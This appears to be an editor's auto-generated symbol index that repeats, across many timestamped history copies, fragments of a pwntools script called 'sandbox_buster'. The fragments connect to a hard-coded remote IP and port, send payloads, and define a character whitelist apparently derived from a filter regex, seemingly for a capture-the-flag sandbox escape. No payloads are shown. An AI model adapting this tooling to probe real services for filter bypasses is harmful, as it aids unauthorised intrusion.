        "detail": ".history.sandbox_buster_20250515210832",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210832",
        "description": ".history.sandbox_buster_20250515210832",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515210832",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210832",
        "description": ".history.sandbox_buster_20250515210832",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515210832",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210903",
        "description": ".history.sandbox_buster_20250515210903",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515210903",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210903",
        "description": ".history.sandbox_buster_20250515210903",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515210903",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210903",
        "description": ".history.sandbox_buster_20250515210903",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515210903",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210903",
        "description": ".history.sandbox_buster_20250515210903",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515210903",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210903",
        "description": ".history.sandbox_buster_20250515210903",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515210903",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210903",
        "description": ".history.sandbox_buster_20250515210903",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515210903",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210943",
        "description": ".history.sandbox_buster_20250515210943",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515210943",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210943",
        "description": ".history.sandbox_buster_20250515210943",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515210943",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515210943",
        "description": ".history.sandbox_buster_20250515210943",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515210943",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210943",
        "description": ".history.sandbox_buster_20250515210943",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515210943",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210943",
        "description": ".history.sandbox_buster_20250515210943",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515210943",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515210943",
        "description": ".history.sandbox_buster_20250515210943",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515210943",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212302",
        "description": ".history.sandbox_buster_20250515212302",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515212302",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212302",
        "description": ".history.sandbox_buster_20250515212302",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515212302",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212302",
        "description": ".history.sandbox_buster_20250515212302",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515212302",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212302",
        "description": ".history.sandbox_buster_20250515212302",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515212302",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212302",
        "description": ".history.sandbox_buster_20250515212302",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515212302",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212302",
        "description": ".history.sandbox_buster_20250515212302",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515212302",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212340",
        "description": ".history.sandbox_buster_20250515212340",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515212340",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212340",
        "description": ".history.sandbox_buster_20250515212340",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515212340",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212340",
        "description": ".history.sandbox_buster_20250515212340",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515212340",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212340",
        "description": ".history.sandbox_buster_20250515212340",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515212340",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212340",
        "description": ".history.sandbox_buster_20250515212340",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515212340",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212340",
        "description": ".history.sandbox_buster_20250515212340",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515212340",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212432",
        "description": ".history.sandbox_buster_20250515212432",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515212432",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212432",
        "description": ".history.sandbox_buster_20250515212432",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515212432",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515212432",
        "description": ".history.sandbox_buster_20250515212432",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515212432",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212432",
        "description": ".history.sandbox_buster_20250515212432",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515212432",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212432",
        "description": ".history.sandbox_buster_20250515212432",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515212432",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515212432",
        "description": ".history.sandbox_buster_20250515212432",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515212432",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213508",
        "description": ".history.sandbox_buster_20250515213508",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515213508",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213508",
        "description": ".history.sandbox_buster_20250515213508",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515213508",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213508",
        "description": ".history.sandbox_buster_20250515213508",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515213508",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213508",
        "description": ".history.sandbox_buster_20250515213508",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515213508",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213508",
        "description": ".history.sandbox_buster_20250515213508",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515213508",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213508",
        "description": ".history.sandbox_buster_20250515213508",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515213508",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213612",
        "description": ".history.sandbox_buster_20250515213612",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515213612",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213612",
        "description": ".history.sandbox_buster_20250515213612",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515213612",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213612",
        "description": ".history.sandbox_buster_20250515213612",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515213612",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213612",
        "description": ".history.sandbox_buster_20250515213612",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515213612",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213612",
        "description": ".history.sandbox_buster_20250515213612",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515213612",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213612",
        "description": ".history.sandbox_buster_20250515213612",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515213612",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213645",
        "description": ".history.sandbox_buster_20250515213645",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515213645",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213645",
        "description": ".history.sandbox_buster_20250515213645",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515213645",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213645",
        "description": ".history.sandbox_buster_20250515213645",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515213645",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213645",
        "description": ".history.sandbox_buster_20250515213645",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515213645",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213645",
        "description": ".history.sandbox_buster_20250515213645",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515213645",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213645",
        "description": ".history.sandbox_buster_20250515213645",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515213645",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213716",
        "description": ".history.sandbox_buster_20250515213716",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515213716",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213716",
        "description": ".history.sandbox_buster_20250515213716",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515213716",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515213716",
        "description": ".history.sandbox_buster_20250515213716",
